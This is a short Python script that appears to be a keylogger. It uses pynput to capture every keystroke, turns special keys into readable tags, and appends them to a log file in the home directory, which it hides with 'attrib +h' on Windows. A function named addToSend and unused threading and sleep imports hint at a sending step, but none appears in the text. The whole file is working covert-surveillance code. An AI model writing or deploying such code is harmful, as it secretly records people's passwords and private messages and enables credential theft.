from pynput import keyboard
import os
from time import sleep
from sys import platform
from threading import Thread

file = 	os.path.expanduser("~/.log.txt")
with open(file, "a") as f:
    pass

if platform == "win32":
    os.system("attrib +h " + file)

def addToSend(key):
    try:
        with open(file, "a", encoding="utf-8") as f:
            f.write(key)
    except:
        pass

def on_press(key):
    key = str(key)
    good = [["Key.space", " "],["Key.enter", "[Ent]\n"],["Key.shift", "[Sh]"],["Key.insert", "[Ins]"],["Key.backspace", "[Bck]"],["Key.alt_l", "[Alt L]"],["Key.alt_r", "[Alt R]"],["Key.ctrl_l", "[Ctrl L]"],["Key.ctrl", "[Ctrl]"],["Key.ctrl_r", "[Ctrl R]"],["Key.caps_lock", "[Caps]"],["Key.down", "[Down Arrow]"],["Key.right", "[Right Arrow]"],["Key.left", "[Left Arrow]"],["Key.up", "[Up Arrow]"],["Key.shift_r", "[Shift R]"],["Key.shift_l", "[Shift L]"],["Key.tab", "[Tab]"],["", ""]]
    for i in range(len(good)):
        if good[i][0] == key:
            key = good[i][1]
            break
    if key != "\"'\"":
        key = key.replace("'", "")
    elif key == "\"'\"":
        key = key.replace('"', "")
    addToSend(key)

keyboard.Listener(on_press=on_press).start()
